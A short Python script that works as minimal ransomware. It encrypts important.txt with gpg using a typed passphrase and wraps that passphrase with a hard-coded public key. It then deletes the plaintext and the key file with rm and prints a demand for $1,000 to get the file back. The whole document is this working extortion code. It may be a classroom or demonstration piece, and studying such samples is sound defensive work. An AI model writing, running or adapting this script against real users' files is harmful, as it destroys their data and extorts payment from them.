#!/usr/bin/python3

import shlex
import subprocess

key = input("Enter a key: ")

with open("key.txt", "w") as f:
    f.write(key)

subprocess.call(shlex.split("gpg -q --armor --import minzhan.gpg.asc"))
subprocess.call(shlex.split(f"gpg -c -q -o encrypted_message.txt.asc --batch --passphrase {key} -a important.txt"))
subprocess.call(shlex.split("gpg -e -q -o encrypted_key.asc -r F4F6CA4BF32A1F2E03A552C06CC2FA43212301B6 -a key.txt"))
subprocess.call(shlex.split("rm key.txt important.txt"))
print("Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send encrypted_key.asc to me.")